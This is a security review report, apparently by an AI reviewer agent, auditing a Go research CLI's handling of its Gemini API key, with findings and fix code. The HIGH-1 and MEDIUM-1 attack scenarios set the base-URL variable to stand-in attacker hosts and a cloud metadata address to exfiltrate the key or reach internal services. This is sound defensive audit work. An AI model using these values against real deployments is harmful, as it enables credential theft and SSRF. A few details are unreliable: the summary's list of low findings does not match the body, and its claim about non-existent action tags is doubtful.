# Security Review — Cycle 1

**Reviewer:** security-reviewer agent  
**Date:** 2026-06-07  
**Scope:** Entire tree at HEAD on `main` (all six completed milestones M0–M6 plus the M7 v2 seams)  
**Method:** Manual source review against the threat model supplied by the team lead

---

## Summary

The codebase has a well-considered security posture for its scope. The credential
scrubber (slog handler + tracer wrappers) is correctly designed and comprehensively
tested. The `secret://` reference grammar is sound and its rejection of literals
is verified. API key routing via header rather than URL query parameter is correct.
Bounded reads are applied throughout. The file sink's asset-name validation
prevents path traversal.

One **high** finding concerns `CHIRON_GEMINI_BASE_URL`: the variable accepts any
URL including HTTP and attacker-controlled hosts, and Go's default HTTP redirect
behaviour does not strip custom headers on cross-origin redirects — together these
allow API-key exfiltration if the variable is set. Two **medium** findings address
unbounded SSE event accumulation and the redirect-header behaviour separately. Three
**low** findings cover CI supply-chain hygiene, report file permissions, and the
lack of TLS enforcement in the base-URL variable. Two **info** notes flag the error
message and OTel trace surfaces.

No CRITICAL findings. No dependency CVEs were found in the pinned versions.

---

## Findings

### HIGH-1 — `CHIRON_GEMINI_BASE_URL` accepts HTTP and arbitrary hosts: API-key exfiltration and SSRF

**File:** `internal/cli/research.go:44,88–90` · `internal/interactions/client.go:53–55`

**Description.**
The `CHIRON_GEMINI_BASE_URL` environment variable is read without validation and
forwarded directly to `interactions.WithBaseURL()`, which only trims a trailing
slash:

```go
// research.go:44
const envGeminiBaseURL = "CHIRON_GEMINI_BASE_URL"

// research.go:89
BaseURL: os.Getenv(envGeminiBaseURL),

// client.go:54
func WithBaseURL(u string) Option {
    return func(c *Client) { c.baseURL = strings.TrimSuffix(u, "/") }
}
```

There is no validation of scheme, host, or reachability. Any string — including
`http://`, `http://internal-metadata-service`, or `https://attacker.example.com` —
is accepted silently.

**Attack scenario.**

1. An attacker who can influence the process environment (compromised CI runner,
   misconfigured container, a second application on the same host that writes to
   shared env) sets `CHIRON_GEMINI_BASE_URL=https://collect.attacker.com`.
2. `chiron research --query ...` resolves the API key and passes it to `gemini.New`.
3. The HTTP client constructs `https://collect.attacker.com/v1beta/interactions`
   and sets `x-goog-api-key: <resolved key>` as a request header on the first
   request (`client.go:228`).
4. The attacker's server logs the header and returns any 2xx or 5xx response.
5. The key is stolen; the legitimate Create path receives nothing and the user sees
   an error — but the key is gone.

Variant: `CHIRON_GEMINI_BASE_URL=http://...` sends the key unencrypted over the
network on any path (LAN interception, logging proxy).

SSRF variant: `CHIRON_GEMINI_BASE_URL=http://169.254.169.254` (GCE metadata) or
any internal address causes Chiron to make authenticated HTTP requests to internal
services from the CLI host.

**Remediation.**
At startup, when the variable is set, validate it:

```go
if raw := os.Getenv(envGeminiBaseURL); raw != "" {
    u, err := url.Parse(raw)
    if err != nil || u.Scheme != "https" || u.Host == "" {
        return fmt.Errorf("CHIRON_GEMINI_BASE_URL must be an absolute https:// URL, got %q", raw)
    }
    baseURL = raw
}
```

Document the variable in `AGENTS.md` and `SECURITY.md` as security-sensitive:
it must never be set in production deployments, and its absence is the safe
default. Optionally add a build tag or compile-time sentinel that disables it
entirely in release builds.

**CWE:** CWE-918 (SSRF) · CWE-319 (Cleartext Transmission of Sensitive Information)

---

### MEDIUM-1 — `x-goog-api-key` forwarded on cross-domain HTTP redirects

**File:** `internal/interactions/client.go:105–116,213–255`

**Description.**
Go's `net/http` client explicitly protects only four headers on cross-domain
redirects: `Authorization`, `Www-Authenticate`, `Cookie`, and `Cookie2`
(see `net/http.shouldCopyHeaderOnRedirect`). The `x-goog-api-key` header set at
`client.go:228` is not in this list. If the server at `c.baseURL` responds with
a redirect (HTTP 301/302/307/308) whose `Location` points to a different host,
Go follows the redirect and re-sends `x-goog-api-key` to the new host.

In production (base URL = `generativelanguage.googleapis.com`) this is not
exploitable: Google controls its own redirect destinations. The risk is real when
combined with HIGH-1: an attacker-controlled base URL can serve a redirect to a
second logging server, so the key reaches a host the operator did not configure
and the attacker receives it via two channels instead of one.

**Attack scenario.**

1. `CHIRON_GEMINI_BASE_URL=https://relay.attacker.com` (an HTTPS relay the
   attacker controls).
2. The relay responds 302 to `https://log.attacker.com/v1beta/interactions`.
3. Go follows the redirect and sends `x-goog-api-key` to `log.attacker.com`.
4. Both the relay and the logging server receive the key.

**Remediation.**
Supply a custom `CheckRedirect` function that refuses any redirect to a host
different from the original request's host:

```go
httpClient = &http.Client{
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        if req.URL.Host != via[0].URL.Host {
            return fmt.Errorf("interactions: redirect to %s refused: cross-origin redirect with sensitive headers", req.URL.Host)
        }
        if len(via) >= 3 {
            return fmt.Errorf("interactions: too many redirects")
        }
        return nil
    },
}
```

This mirrors what browsers do for CORS-sensitive requests. Three redirects is a
generous bound; the production Gemini API redirects zero times in the normal path.

**CWE:** CWE-601 (Open Redirect) · CWE-200 (Exposure of Sensitive Information)

---

### MEDIUM-2 — SSE `data:` line accumulation within one event is unbounded

**File:** `internal/interactions/stream.go:124–127,163–187`

**Description.**
The SSE parser uses `bufio.Scanner` with `maxEventBytes` (default 16 MiB) as the
maximum **line** size. Individual lines are bounded:

```go
bufSize := min(int64(64<<10), c.maxEventBytes)
scanner := bufio.NewScanner(resp.Body)
scanner.Buffer(make([]byte, bufSize), int(c.maxEventBytes))
```

However, one SSE event can span many `data:` field lines. Each line is appended
to the `data` slice:

```go
case "data":
    if haveData {
        data = append(data, '\n')
    }
    data = append(data, value...)
    haveData = true
```

There is no bound on the accumulated length of `data` across lines within a single
event dispatch. A server that streams thousands of `data:` lines each approaching
`maxEventBytes` (16 MiB) for a single event could exhaust process memory within the
30-minute context window.

In production this is not reachable because the Gemini API sends well-formed events.
The attack requires an endpoint under the attacker's control (see HIGH-1). If
HIGH-1 is fixed (scheme validation + host allowlist), this attack becomes
unreachable.

**Remediation.**
Track the total accumulated event byte count and reject when it exceeds
`maxEventBytes`:

```go
case "data":
    needed := int64(len(data) + 1 + len(value))
    if needed > s.maxEventBytes {
        return nil, fmt.Errorf("interactions: SSE event data exceeds %d-byte bound", s.maxEventBytes)
    }
    if haveData {
        data = append(data, '\n')
    }
    data = append(data, value...)
    haveData = true
```

**CWE:** CWE-789 (Uncontrolled Memory Allocation) · CWE-400 (Uncontrolled Resource Consumption)

---

### LOW-1 — CI workflow actions pinned to mutable tag references

**File:** `.github/workflows/ci.yml:9–10,16–17,19,30,33–34`

**Description.**
All three actions in the workflow use tag references rather than full commit SHA
hashes:

```yaml
- uses: actions/checkout@v6
- uses: actions/setup-go@v6
- uses: golangci/golangci-lint-action@v9
```

Tags in a third-party repository can be moved (by the repository owner, by a
compromised maintainer, or by an attacker who gains push access) to point to
different commits without any change to the workflow file. If a tag is silently
redirected to a malicious commit, arbitrary code runs in the CI environment with
access to any secrets the workflow uses (e.g., any future publish token).

**Remediation.**
Pin each action to its full commit SHA:

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-go@f111f3307d8850f501ac008e886eec1fd1932a34  # v5.3.0
- uses: golangci/golangci-lint-action@ec5d18412c0aeab7936cb16880d708ba2a64e1ae  # v6
```

Use `actions/checkout@v4` rather than `@v6` (v6 does not exist at the time of
this review; any reference to a non-existent tag resolves to the latest default
branch, which is undesirable). Pin hashes with a comment giving the resolved
version for human readability. Tools such as `pinact` or Dependabot's
`update-actions` can automate renewal.

**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

---

### LOW-2 — Report and asset files written with world-readable permissions (0o644)

**File:** `internal/sink/file.go:47,51`

**Description.**
The file sink writes both chart assets and the Markdown report with `0o644`:

```go
os.WriteFile(filepath.Join(dir, a.Name), a.Data, 0o644)
os.WriteFile(f.path, result.Report.Markdown, 0o644)
```

The JSONL trace file (`internal/trace/jsonl.go:36`) is correctly `0o600`:

```go
os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
```

A research report contains the query text (which may describe a sensitive
competitive, legal, or strategic investigation), the full citation list (sources
consulted), token usage, and YAML front matter. On a multi-user host or a shared
filesystem, `0o644` makes this content readable by every local user.

**Remediation.**
Use `0o600` for all output files:

```go
os.WriteFile(filepath.Join(dir, a.Name), a.Data, 0o600)
os.WriteFile(f.path, result.Report.Markdown, 0o600)
```

If the intent is that reports should be group-accessible (e.g., shared directories
on a research team's NFS mount), `0o640` is a reasonable middle ground. Make the
mode a configurable parameter on `File` rather than a constant, so callers can
override it. The restrictive default should be documented.

**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)

---

### LOW-3 — `secret://file` resolver does not check key-file permissions

**File:** `internal/secret/resolve.go:113–129`

**Description.**
The `File` resolver reads the secret file with `os.ReadFile` and returns its
contents if non-empty, without inspecting the file's mode bits:

```go
b, err := os.ReadFile(r.Name)
```

A secret file mistakenly created with `0o644` (world-readable) or `0o640`
(group-readable) is read and used without warning. The operator has no indication
that the secret is less protected than it should be.

This is a hardening gap rather than a direct exploit: the resolver behaves
correctly (it returns the secret), but silently tolerates a misconfigured
deployment.

**Remediation.**
After reading the file, stat it and warn if the mode is more permissive than
`0o600`:

```go
info, statErr := os.Stat(r.Name)
if statErr == nil && info.Mode().Perm()&0o177 != 0 {
    // Use slog.Warn rather than returning an error, so a
    // misconfigured file does not block the run entirely.
    slog.Warn("secret file has overly permissive mode",
        "path", r.Name, "mode", info.Mode().Perm())
}
```

The slog handler will pass this through the scrubber, so `r.Name` does not need
special handling. The severity is LOW because the mitigating control is that
operator responsibility for file permissions is conventional and documented in the
secret:// grammar decision.

**CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)

---

### INFO-1 — API error messages reach stderr without credential scrubbing

**File:** `internal/cli/root.go:20` · `internal/interactions/error.go:25–38`

**Description.**
Errors that propagate out of the run core reach `Execute()` and are printed via:

```go
fmt.Fprintln(os.Stderr, "chiron:", err)
```

This path does not go through the `secret.ScrubHandler` wrapping the slog logger.
`*APIError.Error()` includes the `Message` field from the API response body, which
is whatever the Gemini API server places in its `{"error":{"message":"..."}}` JSON.

If Google's API were to echo the API key back in an error message (e.g., "Invalid
API key 'AIza...' — check your credentials"), it would be printed unscrubbed to
stderr.

This is not currently exploitable: the Gemini API sends the key only as a request
header, not as a request body field, and does not echo request headers in error
responses. The finding is noted because the structural guarantee ("a key cannot
transit logs via any path") that `ScrubHandler` provides does not extend to this
code path.

**Remediation (hardening).**
Run the final error through the scrubber before printing:

```go
fmt.Fprintln(os.Stderr, "chiron:", secret.Scrub(err.Error()))
```

This costs one function call and eliminates the theoretical exposure.

**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

---

### INFO-2 — OTel trace endpoint receives research queries without authentication validation

**File:** `internal/cli/research.go:151–157` · `internal/trace/otel.go:38–58`

**Description.**
When `OTEL_EXPORTER_OTLP_ENDPOINT` or `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT` is
set, the OTel tracer is initialised and span attributes (including the research
query at `run.go:117` and the interaction ID) are exported to the configured
endpoint. There is no validation that the endpoint is reachable by a trusted
party, nor is the variable documented as security-sensitive.

An attacker who can set `OTEL_EXPORTER_OTLP_ENDPOINT` in the process environment
receives research queries and interaction IDs. These do not include the API key
(the scrubber runs on all string values before the OTel SDK sees them), but may
reveal sensitive research topics or serve as interaction IDs that can be used with
a stolen key.

This is standard OTel behaviour shared by all OTLP-instrumented applications and
is not a Chiron-specific code bug. The recommended control is to treat both OTel
variables as security-sensitive deployment configuration, document them in
`SECURITY.md`, and in GKE v2 restrict them to operator-supplied Kubernetes Secrets
rather than user-configurable env vars.

**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorised Actor)

---

## Areas checked and found sound

**Credential scrubber.** `secret.ScrubHandler` is correctly layered: it wraps the
slog handler rather than the logger, so there is no path to the backend that
bypasses scrubbing. `WithAttrs`, `WithGroup`, and `LogValue` resolution are all
covered. The `JSONL` and `OTel` tracers route every string through `secret.Scrub`
before the SDK sees it. Test coverage (`TestKeyCannotTransitLogger`,
`TestScrubPatterns`, `TestScrubLeavesProseAlone`) is thorough.

**API key placement.** The key travels only in the `x-goog-api-key` header, never
in the URL or request body. Error messages from the `do()` function include method
and path (`/v1beta/interactions`), never the key. `TestAPIKeyNeverInErrors` pins
this for both HTTP and transport failure modes.

**`secret://` reference grammar.** Literal values are rejected without being
echoed into the error. File paths must be absolute. Empty variable names and empty
file paths are rejected. `TestParseRefLiteralNotEchoed` verifies the non-echo
guarantee.

**Path traversal in the file sink.** `a.Name != filepath.Base(a.Name)` correctly
catches `../` and similar. Asset names are generated by the formatter as
`chart-N.<ext>` from a hand-rolled MIME table, so they are never API- or
user-controlled in the current call path.

**Body read bounds.** `readBounded` uses `io.LimitReader(r, max+1)` and fails
loudly (not silently truncating) when the bound is exceeded. Default bounds are
64 MiB (responses), 16 MiB (SSE events), 1 MiB (error bodies).

**Interaction ID URL-escaping.** `url.PathEscape(id)` is applied before
concatenation (`client.go:171`); `TestGetAndCancelPaths` pins `v1/odd id` →
`v1%2Fodd%20id`.

**Create is never retried in the gemini adapter.** `WithMaxRetries(0)` on the
create client prevents double-spend on ambiguous 5xx responses. `TestCreateNeverRetried`
(gemini package) pins exactly one attempt on a 502.

**SSE resume.** `last_event_id` travels as a query parameter (`?last_event_id=`),
not the `Last-Event-ID` header, matching the reference's uncertainty. The
`frameID = ""` NUL-check per the SSE spec is present. The scanner returns
`bufio.ErrTooLong` rather than silently truncating an oversized line.

**Dependency surface.** No vendor AI SDKs. Only stdlib, cobra, pflag, yaml.v3,
and the OTel SDK are direct dependencies. No known CVEs in the pinned versions
(cobra v1.10.2, yaml.v3 v3.0.1, otel v1.44.0, grpc v1.81.1, protobuf v1.36.11).
`go.sum` is present and complete.

**Config decoding.** `yaml.Decoder.KnownFields(true)` rejects unknown keys. JSON
is accepted as a YAML subset. The secret-reference rule (`api_key_ref` must carry
`secret://`) is enforced in `Validate()`. `EncodeJSON` emits the reference, not
the resolved key.

**OTel endpoint discovery.** The tracer is bound only when at least one of the
standard `OTEL_EXPORTER_OTLP_*` variables names an endpoint; otherwise the no-op
tracer is used, so an unconfigured run generates no network traffic.

---

## Verdict

The code is well-engineered from a security standpoint. The scrubber coverage is
genuine (not cosmetic), the secret-reference grammar is enforced, and bounded reads
are applied consistently. The two findings that most need attention before v2 are:

1. **HIGH-1** (`CHIRON_GEMINI_BASE_URL`): must be validated to HTTPS with a known
   host before the production deployment gates open. If the variable is retained in
   v2 at all, it should be compile-time disabled in release builds.
2. **MEDIUM-1** (redirect header forwarding): a custom `CheckRedirect` function is
   a one-time fix that eliminates the risk regardless of what the base URL is set to.

The three LOW findings are hardening improvements that can be addressed in the
normal course of Remediation 1 without urgency.
